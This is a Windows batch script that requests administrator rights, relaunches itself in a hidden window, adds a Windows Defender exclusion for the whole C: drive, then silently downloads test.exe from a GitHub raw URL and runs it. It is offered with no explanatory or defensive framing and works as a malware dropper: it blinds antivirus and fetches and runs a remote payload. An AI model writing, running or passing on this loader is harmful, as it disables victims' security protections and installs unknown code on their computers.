@echo off
:requestPrivileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process -WindowStyle Hidden -File '%~f0' -Verb runAs"
    exit /b
)

rem ssss
start /b powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\'"
set URL=https://raw.githubusercontent.com/Sichostexe/LoxFiles/refs/heads/main/test.exe
set FILENAME=test.exe
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri %URL% -OutFile %FILENAME%"
start %FILENAME%
exit
